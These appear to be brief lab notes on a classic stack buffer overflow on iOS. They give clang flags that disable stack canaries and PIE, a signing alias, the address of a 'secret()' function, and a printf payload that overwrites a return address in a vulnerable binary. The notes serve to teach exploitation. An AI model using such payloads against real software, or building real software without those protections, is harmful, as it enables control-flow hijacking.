Classic Stack Buffer Overflow
=============================

**An alias to compile without protection using clang**

Where ``-mno-thumb`` is used to force 32 bits instead of 16 bits, `-fno-stack-protector` to disable stack canaries and ``-fno-pie`` to disable ASLR.

``alias clangd="clang -isysroot /var/theos/sdks/iPhoneOS9.3.sdk -mno-thumb -fno-stack-protector -fno-pie"``

**An alias to sign a binary**

``alias sign="ldid -S"``

**Location of the iOS crash logs**

``/var/mobile/Library/Logs/CrashReporter``

**Pointer to "secret()"**

This can be found using ``disassemble secret`` in gdb.

0x0000bf58 (\\x58\\xbf\\x00\\x00)

**Using "printf" to input malicious data into the binary**

``printf "AAAABBBBCCCCDDDDEEEE\x58\xbf\x00\x00" | ./vuln``